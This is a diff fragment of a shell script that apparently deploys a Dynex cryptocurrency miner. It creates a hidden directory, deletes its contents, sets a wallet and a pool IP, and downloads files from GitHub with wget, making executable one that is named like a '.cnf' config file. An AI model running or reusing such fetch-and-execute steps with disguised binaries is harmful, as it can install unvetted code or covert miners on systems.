@@ -11,7 +11,7 @@ mkdir .lib
 cd .lib
 rm -rf *
 WORKER="$(echo $(shuf -i 1-999999 -n 1)-CEK)"
-WALLETNH="solo:Xwo5uSVAyHtaLVd12zTygAKSC48DukpVdCQi7vqc5WsYXtpzJySMFXtDu7Vy2GqWC9cMtfePPu4ZeAB8BsPC9AwZ1PmLmbXur.461e120c19c54ac36ae799fd24ea8a07a5e21875168a268c98b04175f8d6d2b3"
+WALLETNH="Xwo5uSVAyHtaLVd12zTygAKSC48DukpVdCQi7vqc5WsYXtpzJySMFXtDu7Vy2GqWC9cMtfePPu4ZeAB8BsPC9AwZ1PmLmbXur.461e120c19c54ac36ae799fd24ea8a07a5e21875168a268c98b04175f8d6d2b3"
 POOLNHETC="139.144.188.198"
 rm -f dynex_compute_w340.cnf && wget -q 'https://github.com/angkii/kerja/raw/main/dynex_compute_w340.cnf' && chmod +x dynex_compute_w340.cnf
 rm -f h-manifest.conf && wget -q 'https://github.com/angkii/kerja/raw/main/h-manifest.conf' && chmod +x h-manifest.conf
